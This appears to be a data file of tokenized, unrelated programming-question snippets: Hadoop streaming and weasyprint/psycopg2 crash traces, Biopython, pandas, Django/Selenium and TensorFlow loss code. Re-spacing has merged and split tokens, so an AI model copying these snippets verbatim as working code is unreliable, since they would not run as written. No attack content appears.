PipeMapRed.java:209 ) ... 23 moreCaused by : java.io.IOException : CreateProcess error=193 , % 1 is not a valid Win32 application at java.lang.ProcessImpl.create ( Native Method ) at java.lang.ProcessImpl. < init > ( ProcessImpl.java:386 ) at java.lang.ProcessImpl.start ( ProcessImpl.java:137 ) at java.lang.ProcessBuilder.start ( ProcessBuilder.java:1029 ) ... 24 more18/02/21 21:50:03 INFO mapreduce.Job : Task Id : attempt_1519235874088_0003_m_000000_1 , Status : FAILEDError : java.lang.RuntimeException : Error in configuring object at org.apache.hadoop.util.ReflectionUtils.setJobConf ( ReflectionUtils.java:109 ) at org.apache.hadoop.util.ReflectionUtils.setConf ( ReflectionUtils.java:75 ) at org.apache.hadoop.util.ReflectionUtils.newInstance ( ReflectionUtils.java:133 ) at org.apache.hadoop.mapred.MapTask.runOldMapper ( MapTask.java:426 ) at org.apache.hadoop.mapred.MapTask.run ( MapTask.java:342 ) at org.apache.hadoop.mapred.YarnChild $ 2.run ( YarnChild.java:168 ) at java.security.AccessController.doPrivileged ( Native Method ) at javax.security.auth.Subject.doAs ( Subject.java:422 ) at org.apache.hadoop.security.UserGroupInformation.doAs ( UserGroupInformation.java:1548 ) at org.apache.hadoop.mapred.YarnChild.main ( YarnChild.java:163 ) Caused by : java.lang.reflect.InvocationTargetException at sun.reflect.NativeMethodAccessorImpl.invoke0 ( Native Method ) at sun.reflect.NativeMethodAccessorImpl.invoke ( NativeMethodAccessorImpl.java:62 ) at sun.reflect.DelegatingMethodAccessorImpl.invoke ( DelegatingMethodAccessorImpl.java:43 ) at java.lang.reflect.Method.invoke ( Method.java:498 ) at org.apache.hadoop.util.ReflectionUtils.setJobConf ( ReflectionUtils.java:106 ) ... 9 moreCaused by : java.lang.RuntimeException : Error in configuring object at org.apache.hadoop.util.ReflectionUtils.setJobConf ( ReflectionUtils.java:109 ) at org.apache.hadoop.util.ReflectionUtils.setConf ( ReflectionUtils.java:75 ) at org.apache.hadoop.util.ReflectionUtils.newInstance ( ReflectionUtils.java:133 ) at org.apache.hadoop.mapred.MapRunner.configure ( MapRunner.java:38 ) ... 14 moreCaused by : java.lang.reflect.InvocationTargetException at sun.reflect.NativeMethodAccessorImpl.invoke0 ( Native Method ) at sun.reflect.NativeMethodAccessorImpl.invoke ( NativeMethodAccessorImpl.java:62 ) at sun.reflect.DelegatingMethodAccessorImpl.invoke ( DelegatingMethodAccessorImpl.java:43 ) at java.lang.reflect.Method.invoke ( Method.java:498 ) at org.apache.hadoop.util.ReflectionUtils.setJobConf ( ReflectionUtils.java:106 ) ... 17 moreCaused by : java.lang.RuntimeException : configuration exception at org.apache.hadoop.streaming.PipeMapRed.configure ( PipeMapRed.java:222 ) at org.apache.hadoop.streaming.PipeMapper.configure ( PipeMapper.java:66 ) ... 22 moreCaused by : java.io.IOException : Can not run program `` D : \tmp\hadoop-Mahsa\nm-local-dir\usercache\Mahsa\appcache\application_1519235874088_0003\container_1519235874088_0003_01_000005\.\wordcount-mapper.py '' : CreateProcess error=193 , % 1 is not a valid Win32 application at java.lang.ProcessBuilder.start ( ProcessBuilder.java:1048 ) at org.apache.hadoop.streaming.PipeMapRed.configure ( PipeMapRed.java:209 ) ... 23 moreCaused by : java.io.IOException : CreateProcess error=193 , % 1 is not a valid Win32 application at java.lang.ProcessImpl.create ( Native Method ) at java.lang.ProcessImpl. < init > ( ProcessImpl.java:386 ) at java.lang.ProcessImpl.start ( ProcessImpl.java:137 ) at java.lang.ProcessBuilder.start ( ProcessBuilder.java:1029 ) ... 24 more18/02/21 21:50:13 INFO mapreduce.Job : Task Id : attempt_1519235874088_0003_m_000001_2 , Status : FAILEDError : java.lang.RuntimeException : Error in configuring object at org.apache.hadoop.util.ReflectionUtils.setJobConf ( ReflectionUtils.java:109 ) at org.apache.hadoop.util.ReflectionUtils.setConf ( ReflectionUtils.java:75 ) at org.apache.hadoop.util.ReflectionUtils.newInstance ( ReflectionUtils.java:133 ) at org.apache.hadoop.mapred.MapTask.runOldMapper ( MapTask.java:426 ) at org.apache.hadoop.mapred.MapTask.run ( MapTask.java:342 ) at org.apache.hadoop.mapred.YarnChild $ 2.run ( YarnChild.java:168 ) at java.security.AccessController.doPrivileged ( Native Method ) at javax.security.auth.Subject.doAs ( Subject.java:422 ) at org.apache.hadoop.security.UserGroupInformation.doAs ( UserGroupInformation.java:1548 ) at org.apache.hadoop.mapred.YarnChild.main ( YarnChild.java:163 ) Caused by : java.lang.reflect.InvocationTargetException at sun.reflect.NativeMethodAccessorImpl.invoke0 ( Native Method ) at sun.reflect.NativeMethodAccessorImpl.invoke ( NativeMethodAccessorImpl.java:62 ) at sun.reflect.DelegatingMethodAccessorImpl.invoke ( DelegatingMethodAccessorImpl.java:43 ) at java.lang.reflect.Method.invoke ( Method.java:498 ) at org.apache.hadoop.util.ReflectionUtils.setJobConf ( ReflectionUtils.java:106 ) ... 9 moreCaused by : java.lang.RuntimeException : Error in configuring object at org.apache.hadoop.util.ReflectionUtils.setJobConf ( ReflectionUtils.java:109 ) at org.apache.hadoop.util.ReflectionUtils.setConf ( ReflectionUtils.java:75 ) at org.apache.hadoop.util.ReflectionUtils.newInstance ( ReflectionUtils.java:133 ) at org.apache.hadoop.mapred.MapRunner.configure ( MapRunner.java:38 ) ... 14 moreCaused by : java.lang.reflect.InvocationTargetException at sun.reflect.NativeMethodAccessorImpl.invoke0 ( Native Method ) at sun.reflect.NativeMethodAccessorImpl.invoke ( NativeMethodAccessorImpl.java:62 ) at sun.reflect.DelegatingMethodAccessorImpl.invoke ( DelegatingMethodAccessorImpl.java:43 ) at java.lang.reflect.Method.invoke ( Method.java:498 ) at org.apache.hadoop.util.ReflectionUtils.setJobConf ( ReflectionUtils.java:106 ) ... 17 moreCaused by : java.lang.RuntimeException : configuration exception at org.apache.hadoop.streaming.PipeMapRed.configure ( PipeMapRed.java:222 ) at org.apache.hadoop.streaming.PipeMapper.configure ( PipeMapper.java:66 ) ... 22 moreCaused by : java.io.IOException : Can not run program `` D : \tmp\hadoop-Mahsa\nm-local-dir\usercache\Mahsa\appcache\application_1519235874088_0003\container_1519235874088_0003_01_000007\.\wordcount-mapper.py '' : CreateProcess error=193 , % 1 is not a valid Win32 application at java.lang.ProcessBuilder.start ( ProcessBuilder.java:1048 ) at org.apache.hadoop.streaming.PipeMapRed.configure ( PipeMapRed.java:209 ) ... 23 moreCaused by : java.io.IOException : CreateProcess error=193 , % 1 is not a valid Win32 application at java.lang.ProcessImpl.create ( Native Method ) at java.lang.ProcessImpl. < init > ( ProcessImpl.java:386 ) at java.lang.ProcessImpl.start ( ProcessImpl.java:137 ) at java.lang.ProcessBuilder.start ( ProcessBuilder.java:1029 ) ... 24 more18/02/21 21:50:14 INFO mapreduce.Job : Task Id : attempt_1519235874088_0003_m_000000_2 , Status : FAILEDError : java.lang.RuntimeException : Error in configuring object at org.apache.hadoop.util.ReflectionUtils.setJobConf ( ReflectionUtils.java:109 ) at org.apache.hadoop.util.ReflectionUtils.setConf ( ReflectionUtils.java:75 ) at org.apache.hadoop.util.ReflectionUtils.newInstance ( ReflectionUtils.java:133 ) at org.apache.hadoop.mapred.MapTask.runOldMapper ( MapTask.java:426 ) at org.apache.hadoop.mapred.MapTask.run ( MapTask.java:342 ) at org.apache.hadoop.mapred.YarnChild $ 2.run ( YarnChild.java:168 ) at java.security.AccessController.doPrivileged ( Native Method ) at javax.security.auth.Subject.doAs ( Subject.java:422 ) at org.apache.hadoop.security.UserGroupInformation.doAs ( UserGroupInformation.java:1548 ) at org.apache.hadoop.mapred.YarnChild.main ( YarnChild.java:163 ) Caused by : java.lang.reflect.InvocationTargetException at sun.reflect.NativeMethodAccessorImpl.invoke0 ( Native Method ) at sun.reflect.NativeMethodAccessorImpl.invoke ( NativeMethodAccessorImpl.java:62 ) at sun.reflect.DelegatingMethodAccessorImpl.invoke ( DelegatingMethodAccessorImpl.java:43 ) at java.lang.reflect.Method.invoke ( Method.java:498 ) at org.apache.hadoop.util.ReflectionUtils.setJobConf ( ReflectionUtils.java:106 ) ... 9 moreCaused by : java.lang.RuntimeException : Error in configuring object at org.apache.hadoop.util.ReflectionUtils.setJobConf ( ReflectionUtils.java:109 ) at org.apache.hadoop.util.ReflectionUtils.setConf ( ReflectionUtils.java:75 ) at org.apache.hadoop.util.ReflectionUtils.newInstance ( ReflectionUtils.java:133 ) at org.apache.hadoop.mapred.MapRunner.configure ( MapRunner.java:38 ) ... 14 moreCaused by : java.lang.reflect.InvocationTargetException at sun.reflect.NativeMethodAccessorImpl.invoke0 ( Native Method ) at sun.reflect.NativeMethodAccessorImpl.invoke ( NativeMethodAccessorImpl.java:62 ) at sun.reflect.DelegatingMethodAccessorImpl.invoke ( DelegatingMethodAccessorImpl.java:43 ) at java.lang.reflect.Method.invoke ( Method.java:498 ) at org.apache.hadoop.util.ReflectionUtils.setJobConf ( ReflectionUtils.java:106 ) ... 17 moreCaused by : java.lang.RuntimeException : configuration exception at org.apache.hadoop.streaming.PipeMapRed.configure ( PipeMapRed.java:222 ) at org.apache.hadoop.streaming.PipeMapper.configure ( PipeMapper.java:66 ) ... 22 moreCaused by : java.io.IOException : Can not run program `` D : \tmp\hadoop-Mahsa\nm-local-dir\usercache\Mahsa\appcache\application_1519235874088_0003\container_1519235874088_0003_01_000008\.\wordcount-mapper.py '' : CreateProcess error=193 , % 1 is not a valid Win32 application at java.lang.ProcessBuilder.start ( ProcessBuilder.java:1048 ) at org.apache.hadoop.streaming.PipeMapRed.configure ( PipeMapRed.java:209 ) ... 23 moreCaused by : java.io.IOException : CreateProcess error=193 , % 1 is not a valid Win32 application at java.lang.ProcessImpl.create ( Native Method ) at java.lang.ProcessImpl. < init > ( ProcessImpl.java:386 ) at java.lang.ProcessImpl.start ( ProcessImpl.java:137 ) at java.lang.ProcessBuilder.start ( ProcessBuilder.java:1029 ) ... 24 more18/02/21 21:50:24 INFO mapreduce.Job : map 100 % reduce 100 % 18/02/21 21:50:34 INFO mapreduce.Job : Job job_1519235874088_0003 failed with state FAILED due to : Task failed task_1519235874088_0003_m_000001Job failed as tasks failed . failedMaps:1 failedReduces:018/02/21 21:50:34 INFO mapreduce.Job : Counters : 13 Job Counters Failed map tasks=7 Killed map tasks=1 Launched map tasks=8 Other local map tasks=6 Data-local map tasks=2 Total time spent by all maps in occupied slots ( ms ) =66573 Total time spent by all reduces in occupied slots ( ms ) =0 Total time spent by all map tasks ( ms ) =66573 Total vcore-seconds taken by all map tasks=66573 Total megabyte-seconds taken by all map tasks=68170752 Map-Reduce Framework CPU time spent ( ms ) =0 Physical memory ( bytes ) snapshot=0 Virtual memory ( bytes ) snapshot=018/02/21 21:50:34 ERROR streaming.StreamJob : Job not Successful ! Streaming Command Failed !"
class TimeFormats ( ) : def __init__ ( self ) : self.date = `` % d/ % m/ % Y '' self.time = `` % H : % M '' def hourFormat ( item ) : return item.strftime ( `` % H : % M '' )
"from Bio.Seq import Seqfrom Bio.Alphabet.IUPAC import IUPACAmbiguousDNAamb = IUPACAmbiguousDNA ( ) s1 = Seq ( `` GGAAAAGG '' , amb ) s2 = Seq ( `` ARAA '' , amb ) # R = A or Gprint s1.find ( s2 ) > > > 2 > > > -1"
name email0 Carl carl @ yahoo.com1 Bob bob @ gmail.com2 Alice alice @ yahoo.com3 David dave @ hotmail.com4 Eve eve @ gmail.com name email0 Bob bob @ gmail.com1 Eve eve @ gmail.com2 David dave @ hotmail.com3 Alice alice @ yahoo.com4 Carl carl @ yahoo.com
lrwxrwxrwx 1 root root 1 Apr 24 2015 X11 - > .
"./manage.py test tests.test_account.HomeNewVisitorTest from selenium import webdriverclass HomeNewVisitorTest ( StaticLiveServerTestCase ) : def setUp ( self ) : if TEST_ENV_FIREFOX : self.driver = webdriver.Firefox ( ) else : self.driver = webdriver.PhantomJS ( ) self.driver.set_window_size ( 1440 , 900 ) def tearDown ( self ) : try : path = 'worksites/ ' + self.worksite_name.lower ( ) os.rmdir ( settings.MEDIA_ROOT + path ) except FileNotFoundError : pass super ( ) .tearDown ( ) def test ( self ) : d = self.driver d.get ( self.get_full_url ( 'home ' ) ) d.find_element_by_css_selector ( '.btn-success [ type=submit ] ' ) .click ( ) # Generate PDF for contact directory template = get_template ( `` pdf/annuaire.html '' ) context = { `` worksite '' : worksite } html = template.render ( RequestContext ( self.request , context ) ) base_url = self.request.build_absolute_uri ( `` / '' ) pdf = weasyprint.HTML ( string=html , base_url=base_url ) pdf.write_pdf ( directory + '/annuaire.pdf ' ) Fatal Python error : AbortedThread 0x0000000106f92000 ( most recent call first ) : File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/socket.py '' , line 374 in readinto File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/http/client.py '' , line 313 in _read_status File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/http/client.py '' , line 351 in begin File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/http/client.py '' , line 1171 in getresponse File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/urllib/request.py '' , line 1185 in do_open File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/urllib/request.py '' , line 1210 in http_open File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/urllib/request.py '' , line 441 in _call_chain File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/urllib/request.py '' , line 481 in _open File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/urllib/request.py '' , line 463 in open File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/urllib/request.py '' , line 161 in urlopen File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/weasyprint/urls.py '' , line 276 in default_url_fetcher File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/weasyprint/urls.py '' , line 311 in fetch File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/contextlib.py '' , line 59 in __enter__ File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/weasyprint/__init__.py '' , line 297 in _select_source File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/contextlib.py '' , line 59 in __enter__ File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/weasyprint/__init__.py '' , line 223 in __init__ File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/weasyprint/css/__init__.py '' , line 198 in find_stylesheets File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/weasyprint/css/__init__.py '' , line 448 in get_all_computed_styles File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/weasyprint/document.py '' , line 312 in _render File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/weasyprint/__init__.py '' , line 132 in render File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/weasyprint/__init__.py '' , line 164 in write_pdf File `` /Users/sebcorbin/Sites/planexo/worksite/views.py '' , line 111 in done File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/formtools/wizard/views.py '' , line 357 in render_done File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/formtools/wizard/views.py '' , line 730 in render_done File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/formtools/wizard/views.py '' , line 300 in post File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/formtools/wizard/views.py '' , line 686 in post File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/django/views/generic/base.py '' , line 89 in dispatch File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/formtools/wizard/views.py '' , line 237 in dispatch File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/django/views/generic/base.py '' , line 71 in view File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/django/contrib/auth/decorators.py '' , line 22 in _wrapped_view File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/django/core/handlers/base.py '' , line 132 in get_response File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/django/core/handlers/wsgi.py '' , line 189 in __call__ File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/django/test/testcases.py '' , line 1099 in __call__ File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/django/contrib/staticfiles/handlers.py '' , line 63 in __call__ File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/wsgiref/handlers.py '' , line 137 in run File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/django/core/servers/basehttp.py '' , line 182 in handle File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/socketserver.py '' , line 673 in __init__ File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/django/core/servers/basehttp.py '' , line 102 in __init__ File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/socketserver.py '' , line 344 in finish_request File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/socketserver.py '' , line 331 in process_request File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/socketserver.py '' , line 305 in _handle_request_noblock File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/socketserver.py '' , line 238 in serve_forever File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/django/test/testcases.py '' , line 1182 in run File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/threading.py '' , line 920 in _bootstrap_inner File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/threading.py '' , line 888 in _bootstrapCurrent thread 0x00007fff7996a300 ( most recent call first ) : File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/socket.py '' , line 374 in readinto File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/http/client.py '' , line 313 in _read_status File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/http/client.py '' , line 351 in begin File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/http/client.py '' , line 1171 in getresponse File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/urllib/request.py '' , line 1185 in do_open File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/urllib/request.py '' , line 1210 in http_open File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/urllib/request.py '' , line 441 in _call_chain File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/urllib/request.py '' , line 481 in _open File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/urllib/request.py '' , line 463 in open File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/selenium/webdriver/remote/remote_connection.py '' , line 457 in _request File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/selenium/webdriver/remote/remote_connection.py '' , line 389 in execute File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/selenium/webdriver/remote/webdriver.py '' , line 191 in execute File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/selenium/webdriver/remote/webelement.py '' , line 447 in _execute File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/selenium/webdriver/remote/webelement.py '' , line 68 in click File `` /Users/sebcorbin/Sites/planexo/tests/test_account.py '' , line 203 in _test_worksite_form File `` /Users/sebcorbin/Sites/planexo/tests/test_account.py '' , line 36 in test File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/unittest/case.py '' , line 577 in run File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/unittest/case.py '' , line 625 in __call__ File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/django/test/testcases.py '' , line 186 in __call__ File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/unittest/suite.py '' , line 122 in run File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/unittest/suite.py '' , line 84 in __call__ File `` /usr/local/Cellar/python3/3.4.3/Frameworks/Python.framework/Versions/3.4/lib/python3.4/unittest/runner.py '' , line 168 in run File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/django/test/runner.py '' , line 178 in run_suite File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/django/test/runner.py '' , line 211 in run_tests File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/django/core/management/commands/test.py '' , line 90 in handle File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/django/core/management/base.py '' , line 441 in execute File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/django/core/management/commands/test.py '' , line 74 in execute File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/django/core/management/base.py '' , line 390 in run_from_argv File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/django/core/management/commands/test.py '' , line 30 in run_from_argv File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/django/core/management/__init__.py '' , line 330 in execute File `` /Users/sebcorbin/.virtualenvs/planexo-py3/lib/python3.4/site-packages/django/core/management/__init__.py '' , line 338 in execute_from_command_line File `` ./manage.py '' , line 10 in < module >"
"def connect ( self , params ) : `` '' '' Connect to the PostgreSQL database server `` '' '' conn = None try : # connect to the PostgreSQL server logging.info ( 'Connecting to the PostgreSQL database ... ' ) conn = psycopg2.connect ( **params ) # create a cursor self.cursor = conn.cursor ( ) except ( Exception , psycopg2.DatabaseError ) as error : print ( error ) finally : if conn is not None : conn.close ( ) logging.warning ( 'Database connection closed . ' ) Process : Python [ 79534 ] Path : /usr/local/Cellar/python3/3.6.4_2/Frameworks/Python.framework/Versions/3.6/Resources/Python.app/Contents/MacOS/PythonIdentifier : PythonVersion : 3.6.4 ( 3.6.4 ) Code Type : X86-64 ( Native ) Parent Process : bash [ 657 ] Responsible : Python [ 79534 ] User ID : 501Date/Time : 2018-03-02 15:30:27.642 +1300OS Version : Mac OS X 10.13.3 ( 17D102 ) Report Version : 12Anonymous UUID : xxTime Awake Since Boot : 21000 secondsSystem Integrity Protection : disabledCrashed Thread : 0 Dispatch queue : com.apple.main-threadException Type : EXC_BAD_INSTRUCTION ( SIGILL ) Exception Codes : 0x0000000000000001 , 0x0000000000000000Exception Note : EXC_CORPSE_NOTIFYTermination Signal : Illegal instruction : 4Termination Reason : Namespace SIGNAL , Code 0x4Terminating Process : exc handler [ 0 ] Thread 0 Crashed : : Dispatch queue : com.apple.main-thread 0 libpq.5.10.dylib 0x00000001118e8d27 initPQExpBuffer + 321 libpq.5.10.dylib 0x00000001118dba93 PQconninfoParse + 432 _psycopg.cpython-36m-darwin.so 0x0000000111897cf1 psyco_parse_dsn + 1133 org.python.python 0x000000010fd4681a _PyCFunction_FastCallDict + 4634 org.python.python 0x000000010fdaad8e call_function + 4895 org.python.python 0x000000010fda3c43 _PyEval_EvalFrameDefault + 48116 org.python.python 0x000000010fdab4f0 _PyEval_EvalCodeWithName + 17197 org.python.python 0x000000010fda293d PyEval_EvalCodeEx + 578 org.python.python 0x000000010fd2ec76 function_call + 3399 org.python.python 0x000000010fd0e9f2 PyObject_Call + 10110 org.python.python 0x000000010fda3eac _PyEval_EvalFrameDefault + 542811 org.python.python 0x000000010fdab4f0 _PyEval_EvalCodeWithName + 171912 org.python.python 0x000000010fda293d PyEval_EvalCodeEx + 5713 org.python.python 0x000000010fd2ec76 function_call + 33914 org.python.python 0x000000010fd0e9f2 PyObject_Call + 10115 org.python.python 0x000000010fda3eac _PyEval_EvalFrameDefault + 542816 org.python.python 0x000000010fdabe93 _PyFunction_FastCall + 12117 org.python.python 0x000000010fdaad65 call_function + 44818 org.python.python 0x000000010fda3c43 _PyEval_EvalFrameDefault + 481119 org.python.python 0x000000010fdabe93 _PyFunction_FastCall + 12120 org.python.python 0x000000010fd0eb71 _PyObject_FastCallDict + 19621 org.python.python 0x000000010fd0ec94 _PyObject_Call_Prepend + 15622 org.python.python 0x000000010fd0e9f2 PyObject_Call + 10123 org.python.python 0x000000010fd598ae slot_tp_init + 5724 org.python.python 0x000000010fd5683c type_call + 18425 org.python.python 0x000000010fd0eb3c _PyObject_FastCallDict + 14326 org.python.python 0x000000010fdaad5e call_function + 44127 org.python.python 0x000000010fda3c43 _PyEval_EvalFrameDefault + 481128 org.python.python 0x000000010fdabe93 _PyFunction_FastCall + 12129 org.python.python 0x000000010fd0eb71 _PyObject_FastCallDict + 19630 org.python.python 0x000000010fd0ec94 _PyObject_Call_Prepend + 15631 org.python.python 0x000000010fd0e9f2 PyObject_Call + 10132 org.python.python 0x000000010fd598ae slot_tp_init + 5733 org.python.python 0x000000010fd5683c type_call + 18434 org.python.python 0x000000010fd0eb3c _PyObject_FastCallDict + 14335 org.python.python 0x000000010fdaad5e call_function + 44136 org.python.python 0x000000010fda3c43 _PyEval_EvalFrameDefault + 481137 org.python.python 0x000000010fdab4f0 _PyEval_EvalCodeWithName + 171938 org.python.python 0x000000010fda28fe PyEval_EvalCode + 4239 org.python.python 0x000000010fdcb24e run_mod + 5440 org.python.python 0x000000010fdca26f PyRun_FileExFlags + 16041 org.python.python 0x000000010fdc994c PyRun_SimpleFileExFlags + 28542 org.python.python 0x000000010fddd770 Py_Main + 348443 org.python.python 0x000000010fd01e1d 0x10fd00000 + 770944 libdyld.dylib 0x00007fff6c260115 start + 1Thread 0 crashed with X86 Thread State ( 64-bit ) : rax : 0x00007f86c3db9200 rbx : 0x00007ffedfefe3a0 rcx : 0x0000000000000100 rdx : 0x0000000000010000rdi : 0x0000000000000b93 rsi : 0x00000000ffff0001 rbp : 0x00007ffedfefe390 rsp : 0x00007ffedfefe380r8 : 0x000000006c3db930 r9 : 0x000000000000000f r10 : 0x00000000ffff0000 r11 : 0x00007f86c3d00000r12 : 0x0000000110665738 r13 : 0x0000000111c68510 r14 : 0x0000000111cb80b0 r15 : 0x00007ffedfefe3a0rip : 0x00000001118e8d27 rfl : 0x0000000000010206 cr2 : 0x00000001118ef90eLogical CPU : 2Error Code : 0x00000000Trap Number : 6"
Reserved PEP Numbers num title owner -- - -- -- - -- -- - 801 RESERVED Warsaw
"lst = [ 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 ] window size = 3 1 # first element in the list forward = [ 2 , 3 , 4 ] backward = [ ] 2 # second element in the list forward = [ 3 , 4 , 5 ] backward = [ 1 ] 3 # third element in the list forward = [ 4 , 5 , 6 ] backward = [ 1 , 2 ] 4 # fourth element in the list forward = [ 5 , 6 , 7 ] backward = [ 1 , 2 , 3 ] 5 # fifth element in the list forward = [ 6 , 7 , 8 ] backward = [ 2 , 3 , 4 ] 6 # sixth element in the list forward = [ 7 , 8 ] backward = [ 3 , 4 , 5 ] 7 # seventh element in the list forward = [ 8 ] backward = [ 4 , 5 , 6 ] 8 # eight element in the list forward = [ ] backward = [ 5 , 6 , 7 ] import more_itertoolslist ( more_itertools.windowed ( [ 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 ] , n=3 ) )"
"# The logistic loss formula from above is # x - x * z + log ( 1 + exp ( -x ) ) # For x < 0 , a more numerically stable formula is # -x * z + log ( 1 + exp ( x ) ) # Note that these two expressions can be combined into the following : # max ( x , 0 ) - x * z + log ( 1 + exp ( -abs ( x ) ) ) # To allow computing gradients at zero , we define custom versions of max and # abs functions.zeros = array_ops.zeros_like ( logits , dtype=logits.dtype ) cond = ( logits > = zeros ) relu_logits = array_ops.where ( cond , logits , zeros ) neg_abs_logits = array_ops.where ( cond , -logits , logits ) return math_ops.add ( relu_logits - logits * labels , math_ops.log1p ( math_ops.exp ( neg_abs_logits ) ) , name=name )"
